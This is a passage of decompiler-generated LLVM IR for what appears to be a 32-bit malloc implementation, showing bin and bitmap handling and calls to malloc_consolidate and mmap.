  %v2_127f4 = add i32 %v1_127f4, %v0_127ec
  store i32 %v2_127f4, i32* %r2.global-to-local, align 4
  %v1_127f8 = add i32 %v2_127f4, 4
  %v2_127f8 = inttoptr i32 %v1_127f8 to i32*
  %v3_127f8 = load i32, i32* %v2_127f8, align 4
  store i32 %v3_127f8, i32* %r3.global-to-local, align 4
  store i32 %v1_127ec, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12800

dec_label_pc_12800.loopexit:                      ; preds = %dec_label_pc_126a0
  %v1_126ac = load i32, i32* @r6, align 4
  %v2_126ac = load i32, i32* @sl, align 4
  %v3_126ac = add i32 %v2_126ac, %v1_126ac
  store i32 %v3_126ac, i32* %r2.global-to-local, align 4
  %v2_126b0 = add i32 %v3_126ac, 4
  %v3_126b0 = inttoptr i32 %v2_126b0 to i32*
  %v4_126b0 = load i32, i32* %v3_126b0, align 4
  store i32 %v4_126b0, i32* %r3.global-to-local, align 4
  %v2_126b4 = add i32 %v1_126ac, 8
  store i32 %v2_126b4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12800

dec_label_pc_12800:                               ; preds = %.dec_label_pc_12800_crit_edge, %dec_label_pc_12800.loopexit, %dec_label_pc_127f4
  %v1_12804 = phi i32 [ %v4_12928, %.dec_label_pc_12800_crit_edge ], [ %v3_126ac, %dec_label_pc_12800.loopexit ], [ %v2_127f4, %dec_label_pc_127f4 ]
  %v0_12800 = phi i32 [ %v7_12928, %.dec_label_pc_12800_crit_edge ], [ %v4_126b0, %dec_label_pc_12800.loopexit ], [ %v3_127f8, %dec_label_pc_127f4 ]
  %v1_12800 = or i32 %v0_12800, 1
  store i32 %v1_12800, i32* %r3.global-to-local, align 4
  %v2_12804 = add i32 %v1_12804, 4
  %v3_12804 = inttoptr i32 %v2_12804 to i32*
  store i32 %v1_12800, i32* %v3_12804, align 4
  br label %dec_label_pc_12dc8

dec_label_pc_1280c:                               ; preds = %dec_label_pc_127dc
  %v1_1280c = load i32, i32* @sl, align 4
  %v2_1280c = add i32 %v1_1280c, %v0_127ec
  store i32 %v2_1280c, i32* %r2.global-to-local, align 4
  %v1_12810 = or i32 %v1_1280c, 1
  store i32 %v1_12810, i32* %r3.global-to-local, align 4
  %v0_12814 = load i32, i32* %lr.global-to-local, align 4
  %v1_12814 = or i32 %v0_12814, 1
  store i32 %v1_12814, i32* %r1.global-to-local, align 4
  store i32 %v1_127ec, i32* %r4.global-to-local, align 4
  %v2_1281c = add i32 %v0_127ec, 4
  %v3_1281c = inttoptr i32 %v2_1281c to i32*
  store i32 %v1_12810, i32* %v3_1281c, align 4
  %v0_12820 = load i32, i32* %r2.global-to-local, align 4
  %v1_12820 = load i32, i32* @r6, align 4
  %v2_12820 = add i32 %v1_12820, 8
  %v3_12820 = inttoptr i32 %v2_12820 to i32*
  store i32 %v0_12820, i32* %v3_12820, align 4
  %v0_12824 = load i32, i32* %r2.global-to-local, align 4
  %v1_12824 = load i32, i32* @r6, align 4
  %v2_12824 = add i32 %v1_12824, 12
  %v3_12824 = inttoptr i32 %v2_12824 to i32*
  store i32 %v0_12824, i32* %v3_12824, align 4
  %v0_12828 = load i32, i32* %lr.global-to-local, align 4
  %v1_12828 = load i32, i32* %r2.global-to-local, align 4
  %v3_12828 = add i32 %v1_12828, %v0_12828
  %v4_12828 = inttoptr i32 %v3_12828 to i32*
  store i32 %v0_12828, i32* %v4_12828, align 4
  %v0_1282c = load i32, i32* %r1.global-to-local, align 4
  %v1_1282c = load i32, i32* %r2.global-to-local, align 4
  %v2_1282c = add i32 %v1_1282c, 4
  %v3_1282c = inttoptr i32 %v2_1282c to i32*
  store i32 %v0_1282c, i32* %v3_1282c, align 4
  %v0_12830 = load i32, i32* @r6, align 4
  %v1_12830 = load i32, i32* %r2.global-to-local, align 4
  %v2_12830 = add i32 %v1_12830, 12
  %v3_12830 = inttoptr i32 %v2_12830 to i32*
  store i32 %v0_12830, i32* %v3_12830, align 4
  %v0_12834 = load i32, i32* @r6, align 4
  %v1_12834 = load i32, i32* %r2.global-to-local, align 4
  %v2_12834 = add i32 %v1_12834, 8
  %v3_12834 = inttoptr i32 %v2_12834 to i32*
  store i32 %v0_12834, i32* %v3_12834, align 4
  br label %dec_label_pc_12dc8

dec_label_pc_12840:                               ; preds = %dec_label_pc_127a8, %dec_label_pc_12798
  %v1_127d0 = phi i32 [ %storemerge.pre, %dec_label_pc_12798 ], [ %v3_127b4, %dec_label_pc_127a8 ]
  store i32 %v1_127d0, i32* %ip.global-to-local, align 4
  %v9_12840 = icmp eq i32 %v1_127d0, %v1_1279c
  br i1 %v9_12840, label %dec_label_pc_12848.loopexit, label %dec_label_pc_127a8

dec_label_pc_12848.loopexit:                      ; preds = %dec_label_pc_12840
  br label %dec_label_pc_12848

dec_label_pc_12848:                               ; preds = %dec_label_pc_12790.dec_label_pc_12848_crit_edge, %dec_label_pc_12848.loopexit
  %v4_12878.pre-phi = phi i32 [ %.pre203, %dec_label_pc_12790.dec_label_pc_12848_crit_edge ], [ %v4_12798, %dec_label_pc_12848.loopexit ]
  %v1_12848 = add i32 %v0_12848.pre, 1
  store i32 %v1_12848, i32* %r2.global-to-local, align 4
  %v1_1284c = urem i32 %v1_12848, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r0.global-to-local, align 4
  %v6_12858 = shl i32 1, %v1_1284c
  store i32 %v6_12858, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12860 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v4_12860, i32* %r3.global-to-local, align 4
  %v3_12864 = udiv i32 %v1_12848, 32
  store i32 %v3_12864, i32* @r5, align 4
  %v4_12868 = mul nuw nsw i32 %v3_12864, 4
  %v5_12868 = add i32 %v4_12860, %v4_12868
  store i32 %v5_12868, i32* %r2.global-to-local, align 4
  %v1_1286c = add i32 %v5_12868, 820
  %v2_1286c = inttoptr i32 %v1_1286c to i32*
  %v3_1286c = load i32, i32* %v2_1286c, align 4
  store i32 %v3_1286c, i32* @r4, align 4
  %v1_12870 = add i32 %v4_12860, 52
  store i32 %v1_12870, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_12878 = add i32 %v1_12870, %v4_12878.pre-phi
  store i32 %v5_12878, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1287c

dec_label_pc_1287c:                               ; preds = %dec_label_pc_128e4, %dec_label_pc_12848
  %v1_12884 = phi i32 [ %v1_12884.pre, %dec_label_pc_128e4 ], [ %v3_1286c, %dec_label_pc_12848 ]
  %v0_12884 = phi i32 [ %v0_1287c.pre, %dec_label_pc_128e4 ], [ %v6_12858, %dec_label_pc_12848 ]
  %v1_1287c = sub i32 1, %v0_12884
  %v2_1287c = icmp ult i32 %v0_12884, 2
  %v1_1287c. = select i1 %v2_1287c, i32 %v1_1287c, i32 0
  store i32 %v1_1287c., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_12884, %v1_12884
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_1287c
  %v5_12888 = or i32 %v1_1287c., 1
  store i32 %v5_12888, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12894.preheader

bb145:                                            ; preds = %dec_label_pc_1287c
  %v2_1288c = icmp eq i32 %v1_1287c., 0
  br i1 %v2_1288c, label %.dec_label_pc_128d0.preheader_crit_edge, label %dec_label_pc_12894.preheader

.dec_label_pc_128d0.preheader_crit_edge:          ; preds = %bb145
  %v0_128c857.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_128d0.preheader

dec_label_pc_12894.preheader:                     ; preds = %bb145, %.thread15
  %v0_12894.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12894

dec_label_pc_12894:                               ; preds = %dec_label_pc_12894.preheader, %dec_label_pc_128a0
  %v0_12894 = phi i32 [ %v0_12894.pre, %dec_label_pc_12894.preheader ], [ %v1_12894, %dec_label_pc_128a0 ]
  %v1_12894 = add i32 %v0_12894, 1
  store i32 %v1_12894, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_12894, 2
  br i1 %tmp211, label %dec_label_pc_12974.loopexit, label %dec_label_pc_128a0

dec_label_pc_128a0:                               ; preds = %dec_label_pc_12894
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r3.global-to-local, align 4
  %v1_128a4 = load i32, i32* @r8, align 4
  %v2_128a4 = add i32 %v1_128a4, ptrtoint (i32* @global_var_221d4.362 to i32)
  %v3_128a4 = inttoptr i32 %v2_128a4 to i32*
  %v4_128a4 = load i32, i32* %v3_128a4, align 4
  store i32 %v4_128a4, i32* %r2.global-to-local, align 4
  %v4_128a8 = mul i32 %v1_12894, 4
  %v5_128a8 = add i32 %v4_128a4, %v4_128a8
  store i32 %v5_128a8, i32* %r3.global-to-local, align 4
  %v1_128ac = add i32 %v5_128a8, 820
  %v2_128ac = inttoptr i32 %v1_128ac to i32*
  %v3_128ac = load i32, i32* %v2_128ac, align 4
  store i32 %v3_128ac, i32* @r4, align 4
  %v2_128b0 = icmp eq i32 %v3_128ac, 0
  br i1 %v2_128b0, label %dec_label_pc_12894, label %dec_label_pc_128b8

dec_label_pc_128b8:                               ; preds = %dec_label_pc_128a0
  %v4_128b8 = mul i32 %v1_12894, 256
  %v5_128b8 = add i32 %v4_128a4, %v4_128b8
  store i32 %v5_128b8, i32* %r3.global-to-local, align 4
  %v1_128bc = add i32 %v5_128b8, 44
  store i32 %v1_128bc, i32* %r0.global-to-local, align 4
  %v0_128c0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_128c0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_128d0.preheader

dec_label_pc_128d0.preheader:                     ; preds = %.dec_label_pc_128d0.preheader_crit_edge, %dec_label_pc_128b8
  %v0_128c857 = phi i32 [ %v1_128bc, %dec_label_pc_128b8 ], [ %v0_128c857.pre, %.dec_label_pc_128d0.preheader_crit_edge ]
  %v0_128ec = phi i32 [ %v3_128ac, %dec_label_pc_128b8 ], [ %v1_12884, %.dec_label_pc_128d0.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_128c0, %dec_label_pc_128b8 ], [ %v0_12884, %.dec_label_pc_128d0.preheader_crit_edge ]
  %v2_128d054 = and i32 %ip.promoted, %v0_128ec
  %v4_128d056 = icmp eq i32 %v2_128d054, 0
  br i1 %v4_128d056, label %dec_label_pc_128c8, label %dec_label_pc_128d8

dec_label_pc_128c8:                               ; preds = %dec_label_pc_128d0.preheader, %dec_label_pc_128c8
  %v2_128cc59 = phi i32 [ %v2_128cc, %dec_label_pc_128c8 ], [ %ip.promoted, %dec_label_pc_128d0.preheader ]
  %v0_128c858 = phi i32 [ %v1_128c8, %dec_label_pc_128c8 ], [ %v0_128c857, %dec_label_pc_128d0.preheader ]
  %v1_128c8 = add i32 %v0_128c858, 8
  %v2_128cc = mul i32 %v2_128cc59, 2
  %v2_128d0 = and i32 %v2_128cc, %v0_128ec
  %v4_128d0 = icmp eq i32 %v2_128d0, 0
  br i1 %v4_128d0, label %dec_label_pc_128c8, label %dec_label_pc_128d0.dec_label_pc_128d8_crit_edge

dec_label_pc_128d0.dec_label_pc_128d8_crit_edge:  ; preds = %dec_label_pc_128c8
  store i32 %v1_128c8, i32* %r0.global-to-local, align 4
  store i32 %v2_128cc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_128d8

dec_label_pc_128d8:                               ; preds = %dec_label_pc_128d0.dec_label_pc_128d8_crit_edge, %dec_label_pc_128d0.preheader
  %v0_128f8 = phi i32 [ %v2_128cc, %dec_label_pc_128d0.dec_label_pc_128d8_crit_edge ], [ %ip.promoted, %dec_label_pc_128d0.preheader ]
  %v0_1291c = phi i32 [ %v1_128c8, %dec_label_pc_128d0.dec_label_pc_128d8_crit_edge ], [ %v0_128c857, %dec_label_pc_128d0.preheader ]
  %v1_128d8 = add i32 %v0_1291c, 12
  %v2_128d8 = inttoptr i32 %v1_128d8 to i32*
  %v3_128d8 = load i32, i32* %v2_128d8, align 4
  store i32 %v3_128d8, i32* @lr, align 4
  %v9_128dc = icmp eq i32 %v3_128d8, %v0_1291c
  br i1 %v9_128dc, label %dec_label_pc_128e4, label %dec_label_pc_12904

dec_label_pc_128e4:                               ; preds = %dec_label_pc_128d8
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r0.global-to-local, align 4
  %v1_128e8 = load i32, i32* @r8, align 4
  %v2_128e8 = add i32 %v1_128e8, ptrtoint (i32* @global_var_221d4.362 to i32)
  %v3_128e8 = inttoptr i32 %v2_128e8 to i32*
  %v4_128e8 = load i32, i32* %v3_128e8, align 4
  %v2_128ec = sub i32 -1, %v0_128f8
  %v3_128ec = and i32 %v0_128ec, %v2_128ec
  store i32 %v3_128ec, i32* @r4, align 4
  %v1_128f0 = load i32, i32* @r5, align 4
  %v4_128f0 = mul i32 %v1_128f0, 4
  %v5_128f0 = add i32 %v4_128f0, %v4_128e8
  store i32 %v5_128f0, i32* %r3.global-to-local, align 4
  %v1_128f4 = add i32 %v0_1291c, 8
  store i32 %v1_128f4, i32* %r0.global-to-local, align 4
  %v2_128f8 = mul i32 %v0_128f8, 2
  store i32 %v2_128f8, i32* %ip.global-to-local, align 4
  %v2_128fc = add i32 %v5_128f0, 820
  %v3_128fc = inttoptr i32 %v2_128fc to i32*
  store i32 %v3_128ec, i32* %v3_128fc, align 4
  %v0_1287c.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_12884.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1287c

dec_label_pc_12904:                               ; preds = %dec_label_pc_128d8
  %v1_12904 = add i32 %v3_128d8, 4
  %v2_12904 = inttoptr i32 %v1_12904 to i32*
  %v3_12904 = load i32, i32* %v2_12904, align 4
  store i32 %v3_12904, i32* %r3.global-to-local, align 4
  %v1_12908 = and i32 %v3_12904, -4
  store i32 %v1_12908, i32* %r2.global-to-local, align 4
  %v0_1290c = load i32, i32* @sl, align 4
  %v2_1290c = sub i32 %v1_12908, %v0_1290c
  store i32 %v2_1290c, i32* %ip.global-to-local, align 4
  %v1_12910 = add i32 %v3_128d8, 12
  %v2_12910 = inttoptr i32 %v1_12910 to i32*
  %v3_12910 = load i32, i32* %v2_12910, align 4
  store i32 %v3_12910, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_1290c, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_12904
  %v6_12918 = add i32 %v1_12908, %v3_128d8
  store i32 %v6_12918, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_12904, %bb146
  %v2_1291c = add i32 %v3_12910, 8
  %v3_1291c = inttoptr i32 %v2_1291c to i32*
  store i32 %v0_1291c, i32* %v3_1291c, align 4
  %v0_12920 = load i32, i32* %r3.global-to-local, align 4
  %v1_12920 = load i32, i32* %r0.global-to-local, align 4
  %v2_12920 = add i32 %v1_12920, 12
  %v3_12920 = inttoptr i32 %v2_12920 to i32*
  store i32 %v0_12920, i32* %v3_12920, align 4
  %v4_12924 = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_12800_crit_edge, label %dec_label_pc_12930

.dec_label_pc_12800_crit_edge:                    ; preds = %bb147
  %v5_12924 = add i32 %v4_12924, 8
  store i32 %v5_12924, i32* %r4.global-to-local, align 4
  %v4_12928 = load i32, i32* %r2.global-to-local, align 4
  %v5_12928 = add i32 %v4_12928, 4
  %v6_12928 = inttoptr i32 %v5_12928 to i32*
  %v7_12928 = load i32, i32* %v6_12928, align 4
  store i32 %v7_12928, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12800

dec_label_pc_12930:                               ; preds = %bb147
  %v1_12930 = load i32, i32* @sl, align 4
  %v2_12930 = add i32 %v1_12930, %v4_12924
  store i32 %v2_12930, i32* %r1.global-to-local, align 4
  %v1_12938 = load i32, i32* @r6, align 4
  %v2_12938 = add i32 %v1_12938, 8
  %v3_12938 = inttoptr i32 %v2_12938 to i32*
  store i32 %v2_12930, i32* %v3_12938, align 4
  %v0_1293c = load i32, i32* %r1.global-to-local, align 4
  %v1_1293c = load i32, i32* @r6, align 4
  %v2_1293c = add i32 %v1_1293c, 12
  %v3_1293c = inttoptr i32 %v2_1293c to i32*
  store i32 %v0_1293c, i32* %v3_1293c, align 4
  %v0_12940 = load i32, i32* @r6, align 4
  %v1_12940 = load i32, i32* %r1.global-to-local, align 4
  %v2_12940 = add i32 %v1_12940, 8
  %v3_12940 = inttoptr i32 %v2_12940 to i32*
  store i32 %v0_12940, i32* %v3_12940, align 4
  %v0_12944 = load i32, i32* @r6, align 4
  %v1_12944 = load i32, i32* %r1.global-to-local, align 4
  %v2_12944 = add i32 %v1_12944, 12
  %v3_12944 = inttoptr i32 %v2_12944 to i32*
  store i32 %v0_12944, i32* %v3_12944, align 4
  %tmp213 = icmp ult i32 %v1_12930, 256
  br i1 %tmp213, label %bb148, label %.thread124

bb148:                                            ; preds = %dec_label_pc_12930
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r2.global-to-local, align 4
  %v8_12950 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v8_12950, i32* %r3.global-to-local, align 4
  %v4_12954 = load i32, i32* %r1.global-to-local, align 4
  %v6_12954 = add i32 %v8_12950, 48
  %v7_12954 = inttoptr i32 %v6_12954 to i32*
  store i32 %v4_12954, i32* %v7_12954, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_12930, %bb148
  %v0_12958 = load i32, i32* @sl, align 4
  %v1_12958 = or i32 %v0_12958, 1
  store i32 %v1_12958, i32* %r2.global-to-local, align 4
  %v0_1295c = load i32, i32* %ip.global-to-local, align 4
  %v1_1295c = or i32 %v0_1295c, 1
  store i32 %v1_1295c, i32* %r3.global-to-local, align 4
  %v0_12960 = load i32, i32* @lr, align 4
  %v1_12960 = add i32 %v0_12960, 8
  store i32 %v1_12960, i32* %r4.global-to-local, align 4
  %v2_12964 = add i32 %v0_12960, 4
  %v3_12964 = inttoptr i32 %v2_12964 to i32*
  store i32 %v1_12958, i32* %v3_12964, align 4
  %v0_12968 = load i32, i32* %ip.global-to-local, align 4
  %v1_12968 = load i32, i32* %r1.global-to-local, align 4
  %v3_12968 = add i32 %v1_12968, %v0_12968
  %v4_12968 = inttoptr i32 %v3_12968 to i32*
  store i32 %v0_12968, i32* %v4_12968, align 4
  %v0_1296c = load i32, i32* %r3.global-to-local, align 4
  %v1_1296c = load i32, i32* %r1.global-to-local, align 4
  %v2_1296c = add i32 %v1_1296c, 4
  %v3_1296c = inttoptr i32 %v2_1296c to i32*
  store i32 %v0_1296c, i32* %v3_1296c, align 4
  br label %dec_label_pc_12dc8

dec_label_pc_12974.loopexit:                      ; preds = %dec_label_pc_12894
  br label %dec_label_pc_12974

dec_label_pc_12974:                               ; preds = %dec_label_pc_12974.loopexit, %dec_label_pc_12588, %dec_label_pc_12590
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %ip.global-to-local, align 4
  %v4_1297c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v4_1297c, i32* @r0, align 4
  %v1_12980 = add i32 %v4_1297c, 44
  %v2_12980 = inttoptr i32 %v1_12980 to i32*
  %v3_12980 = load i32, i32* %v2_12980, align 4
  store i32 %v3_12980, i32* %ip.global-to-local, align 4
  %v1_12984 = add i32 %v3_12980, 4
  %v2_12984 = inttoptr i32 %v1_12984 to i32*
  %v3_12984 = load i32, i32* %v2_12984, align 4
  %v0_12988 = load i32, i32* @sl, align 4
  %v1_12988 = add i32 %v0_12988, 16
  store i32 %v1_12988, i32* %r1.global-to-local, align 4
  %v1_1298c = and i32 %v3_12984, -4
  store i32 %v1_1298c, i32* %r3.global-to-local, align 4
  %v3_12990 = icmp ult i32 %v1_1298c, %v1_12988
  br i1 %v3_12990, label %dec_label_pc_129c0, label %dec_label_pc_1299c

dec_label_pc_1299c:                               ; preds = %dec_label_pc_12974
  %v2_1299c = sub i32 %v1_1298c, %v0_12988
  %v2_129a0 = add i32 %v0_12988, %v3_12980
  store i32 %v2_129a0, i32* %r1.global-to-local, align 4
  %v1_129a4 = or i32 %v2_1299c, 1
  store i32 %v1_129a4, i32* %r3.global-to-local, align 4
  %v1_129a8 = or i32 %v0_12988, 1
  store i32 %v1_129a8, i32* %r2.global-to-local, align 4
  %v1_129ac = add i32 %v3_12980, 8
  store i32 %v1_129ac, i32* %r4.global-to-local, align 4
  store i32 %v1_129a8, i32* %v2_12984, align 4
  %v0_129b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_129b4 = load i32, i32* @r0, align 4
  %v2_129b4 = add i32 %v1_129b4, 44
  %v3_129b4 = inttoptr i32 %v2_129b4 to i32*
  store i32 %v0_129b4, i32* %v3_129b4, align 4
  %v0_129b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_129b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_129b8 = add i32 %v1_129b8, 4
  %v3_129b8 = inttoptr i32 %v2_129b8 to i32*
  store i32 %v0_129b8, i32* %v3_129b8, align 4
  br label %dec_label_pc_12dc8

dec_label_pc_129c0:                               ; preds = %dec_label_pc_12974
  %v1_129c0 = inttoptr i32 %v4_1297c to i32*
  %v2_129c0 = load i32, i32* %v1_129c0, align 4
  store i32 %v2_129c0, i32* %r3.global-to-local, align 4
  %v1_129c4 = and i32 %v2_129c0, 2
  store i32 %v1_129c4, i32* %ip.global-to-local, align 4
  %v2_129c4 = icmp eq i32 %v1_129c4, 0
  %v1_129c8 = add i32 %v4_1297c, 860
  %v2_129c8 = inttoptr i32 %v1_129c8 to i32*
  %v3_129c8 = load i32, i32* %v2_129c8, align 4
  store i32 %v3_129c8, i32* %r1.global-to-local, align 4
  br i1 %v2_129c4, label %dec_label_pc_129e0, label %dec_label_pc_129d0

dec_label_pc_129d0:                               ; preds = %dec_label_pc_129c0
  %v0_129d0 = call i32 @__malloc_consolidate()
  %v0_129d4 = load i32, i32* @sl, align 4
  %v1_129d4 = add i32 %v0_129d4, -7
  store i32 %v1_129d4, i32* @r0, align 4
  %v0_129d8 = call i32 @malloc()
  store i32 %v0_129d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12dc4

dec_label_pc_129e0:                               ; preds = %dec_label_pc_129c0
  %v1_129e0 = add i32 %v4_1297c, 844
  %v2_129e0 = inttoptr i32 %v1_129e0 to i32*
  %v3_129e0 = load i32, i32* %v2_129e0, align 4
  store i32 %v3_129e0, i32* %r3.global-to-local, align 4
  %v3_129e4 = icmp ult i32 %v0_12988, %v3_129e0
  %v1_129e8 = add i32 %v3_129c8, -1
  store i32 %v1_129e8, i32* %sb.global-to-local, align 4
  br i1 %v3_129e4, label %dec_label_pc_12abc, label %dec_label_pc_129f0

dec_label_pc_129f0:                               ; preds = %dec_label_pc_129e0
  %v1_129f0 = add i32 %v4_1297c, 852
  %v2_129f0 = inttoptr i32 %v1_129f0 to i32*
  %v3_129f0 = load i32, i32* %v2_129f0, align 4
  store i32 %v3_129f0, i32* %r2.global-to-local, align 4
  %v1_129f4 = add i32 %v4_1297c, 848
  %v2_129f4 = inttoptr i32 %v1_129f4 to i32*
  %v3_129f4 = load i32, i32* %v2_129f4, align 4
  store i32 %v3_129f4, i32* %r3.global-to-local, align 4
  %v6_129fc = icmp slt i32 %v3_129f4, %v3_129f0
  br i1 %v6_129fc, label %dec_label_pc_12a00, label %dec_label_pc_12abc

dec_label_pc_12a00:                               ; preds = %dec_label_pc_129f0
  %v1_12a00 = add i32 %v0_12988, 10
  %v2_12a04 = add i32 %v1_12a00, %v3_129c8
  store i32 %v2_12a04, i32* %r3.global-to-local, align 4
  %v2_12a08 = sub i32 0, %v3_129c8
  %v3_12a08 = and i32 %v2_12a04, %v2_12a08
  store i32 %v3_12a08, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_12a08, %v0_12988
  br i1 %tmp214, label %dec_label_pc_12a14, label %dec_label_pc_12abc

dec_label_pc_12a14:                               ; preds = %dec_label_pc_12a00
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_12a08, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12a2c = call i32 @mmap(i32 0, i32 %v3_12a08, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12a2c, i32* %r0.global-to-local, align 4
  %v7_12a30 = icmp eq i32 %v6_12a2c, -1
  br i1 %v7_12a30, label %dec_label_pc_12a14.dec_label_pc_12abc_crit_edge, label %dec_label_pc_12a38

dec_label_pc_12a14.dec_label_pc_12abc_crit_edge:  ; preds = %dec_label_pc_12a14
  %v1_12ae0.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_12abc

dec_label_pc_12a38:                               ; preds = %dec_label_pc_12a14
  %v1_12a38 = urem i32 %v6_12a2c, 8
  store i32 %v1_12a38, i32* %r2.global-to-local, align 4
  %v2_12a38 = icmp eq i32 %v1_12a38, 0
  br i1 %v2_12a38, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_12a38
  %v2_12a3c = sub nsw i32 8, %v1_12a38
  store i32 %v2_12a3c, i32* %r3.global-to-local, align 4
  %v2_12a40 = load i32, i32* @r4, align 4
  %v3_12a40 = sub i32 %v2_12a40, %v2_12a3c
  %v3_12a44 = add i32 %v2_12a3c, %v6_12a2c
  store i32 %v3_12a44, i32* %lr.global-to-local, align 4
  %v2_12a4c = or i32 %v3_12a40, 2
  store i32 %v2_12a4c, i32* %r2.global-to-local, align 4
  %v5_12a54 = inttoptr i32 %v3_12a44 to i32*
  store i32 %v2_12a3c, i32* %v5_12a54, align 4
  %v1_12a58 = load i32, i32* %r2.global-to-local, align 4
  %v2_12a58 = load i32, i32* %lr.global-to-local, align 4
  %v3_12a58 = add i32 %v2_12a58, 4
  %v4_12a58 = inttoptr i32 %v3_12a58 to i32*
  store i32 %v1_12a58, i32* %v4_12a58, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_12a38
  store i32 %v6_12a2c, i32* %lr.global-to-local, align 4
  %v1_12a5050 = load i32, i32* @r4, align 4
  %v2_12a5051 = or i32 %v1_12a5050, 2
  store i32 %v2_12a5051, i32* %r3.global-to-local, align 4
  %v3_12a5c = inttoptr i32 %v6_12a2c to i32*
  store i32 0, i32* %v3_12a5c, align 4
  %v1_12a60 = load i32, i32* %r3.global-to-local, align 4
  %v2_12a60 = load i32, i32* %lr.global-to-local, align 4
  %v3_12a60 = add i32 %v2_12a60, 4
  %v4_12a60 = inttoptr i32 %v3_12a60 to i32*
  store i32 %v1_12a60, i32* %v4_12a60, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12a6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v4_12a6c, i32* %ip.global-to-local, align 4
  %v1_12a70 = add i32 %v4_12a6c, 848
  %v2_12a70 = inttoptr i32 %v1_12a70 to i32*
  %v3_12a70 = load i32, i32* %v2_12a70, align 4
  store i32 %v3_12a70, i32* %r3.global-to-local, align 4
  %v1_12a74 = add i32 %v4_12a6c, 856
  %v2_12a74 = inttoptr i32 %v1_12a74 to i32*
  %v3_12a74 = load i32, i32* %v2_12a74, align 4
  store i32 %v3_12a74, i32* %r2.global-to-local, align 4
  %v1_12a78 = add i32 %v3_12a70, 1
  store i32 %v1_12a78, i32* %r3.global-to-local, align 4
  %v7_12a80 = icmp sgt i32 %v1_12a78, %v3_12a74
  br i1 %v7_12a80, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_12a78, i32* %v2_12a74, align 4
  %v0_12a84.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12a84.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_12a84 = phi i32 [ %v4_12a6c, %.thread30 ], [ %v1_12a84.pre, %bb150 ]
  %v0_12a84 = phi i32 [ %v1_12a78, %.thread30 ], [ %v0_12a84.pre, %bb150 ]
  %v2_12a84 = add i32 %v1_12a84, 848
  %v3_12a84 = inttoptr i32 %v2_12a84 to i32*
  store i32 %v0_12a84, i32* %v3_12a84, align 4
  %v0_12a88 = load i32, i32* %ip.global-to-local, align 4
  %v1_12a88 = add i32 %v0_12a88, 868
  %v2_12a88 = inttoptr i32 %v1_12a88 to i32*
  %v3_12a88 = load i32, i32* %v2_12a88, align 4
  store i32 %v3_12a88, i32* %r3.global-to-local, align 4
  %v1_12a8c = add i32 %v0_12a88, 880
  %v2_12a8c = inttoptr i32 %v1_12a8c to i32*
  %v3_12a8c = load i32, i32* %v2_12a8c, align 4
  store i32 %v3_12a8c, i32* %r2.global-to-local, align 4
  %v0_12a90 = load i32, i32* @r4, align 4
  %v2_12a90 = add i32 %v0_12a90, %v3_12a88
  store i32 %v2_12a90, i32* %r1.global-to-local, align 4
  %v1_12a94 = add i32 %v0_12a88, 872
  %v2_12a94 = inttoptr i32 %v1_12a94 to i32*
  %v3_12a94 = load i32, i32* %v2_12a94, align 4
